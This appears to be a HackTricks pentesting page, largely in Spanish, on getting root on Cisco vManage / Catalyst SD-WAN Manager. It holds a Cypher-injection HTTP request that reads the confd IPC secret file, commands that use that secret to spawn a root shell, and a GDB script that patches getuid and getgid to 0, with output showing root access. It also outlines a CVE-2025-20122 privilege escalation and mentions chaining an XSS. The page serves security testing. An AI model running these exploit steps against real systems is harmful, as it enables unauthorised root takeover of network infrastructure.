# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Ruta 1

(Ejemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Después de indagar un poco en la [documentación](http://66.218.245.39/doc/html/rn03re18.html) relacionada con `confd` y los diferentes binarios (accesibles con una cuenta en el sitio web de Cisco), descubrimos que, para autenticar el socket IPC, utiliza un secreto ubicado en `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
¿Recuerdas nuestra instancia de Neo4j? Se está ejecutando con los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo usando la vulnerabilidad anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
El programa `confd_cli` no admite argumentos de línea de comandos pero llama a `/usr/bin/confd_cli_user` con argumentos. Por lo tanto, podríamos llamar directamente a `/usr/bin/confd_cli_user` con nuestro propio conjunto de argumentos. Sin embargo, no es legible con nuestros privilegios actuales, así que tenemos que recuperarlo del rootfs y copiarlo usando scp, leer la ayuda y usarlo para obtener el shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Ruta 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

El blog¹ del equipo synacktiv describió una forma elegante de obtener un root shell, pero la advertencia es que requiere obtener una copia de `/usr/bin/confd_cli_user` que solo es legible por root. Encontré otra forma de escalar a root sin tal molestia.

Cuando desensamblé el binario `/usr/bin/confd_cli`, observé lo siguiente:

<details>
<summary>Objdump mostrando la recolección de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Cuando ejecuto “ps aux”, observé lo siguiente (_nota -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Hipoteticé que el programa “confd_cli” pasa el ID de usuario y el ID de grupo que recogió del usuario conectado a la aplicación “cmdptywrapper”.

Mi primer intento fue ejecutar “cmdptywrapper” directamente y suministrarle `-g 0 -u 0`, pero falló. Parece que se creó un file descriptor (-i 1015) en algún punto y no puedo falsificarlo.

Como se menciona en el blog de synacktiv (último ejemplo), el programa `confd_cli` no soporta argumentos de línea de comandos, pero puedo influenciarlo con un depurador y afortunadamente GDB está incluido en el sistema.

Creé un script de GDB donde forzé que las API `getuid` y `getgid` devolvieran 0. Dado que ya tengo el privilegio “vmanage” mediante la deserialization RCE, tengo permiso para leer directamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Salida de consola:

<details>
<summary>Salida de consola</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug)

Cisco renombró vManage a *Catalyst SD-WAN Manager*, pero la CLI subyacente sigue ejecutándose en la misma máquina. Un advisory de 2025 (CVE-2025-20122) describe una validación de entrada insuficiente en la CLI que permite a **cualquier usuario local autenticado** obtener root enviando una petición manipulada al servicio de CLI del manager. Combina cualquier low-priv foothold (p. ej., la deserialización de Neo4j de Path1, o un shell de usuario cron/backup) con este fallo para escalar a root sin copiar `confd_cli_user` ni adjuntar GDB:

1. Usa tu shell low-priv para localizar el endpoint IPC de la CLI (típicamente el listener `cmdptywrapper` mostrado en el puerto 4565 en Path2).
2. Construye una petición de CLI que falsifique los campos UID/GID a 0. El bug de validación no hace cumplir el UID del llamador original, así que el wrapper lanza un PTY respaldado por root.
3. Redirige cualquier secuencia de comandos (`vshell; id`) a través de la petición falsificada para obtener un shell root.

> La superficie de explotación es local-only; remote code execution sigue siendo necesaria para conseguir el shell inicial, pero una vez dentro del box la explotación es un único mensaje IPC en lugar de un debugger-based UID patch.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
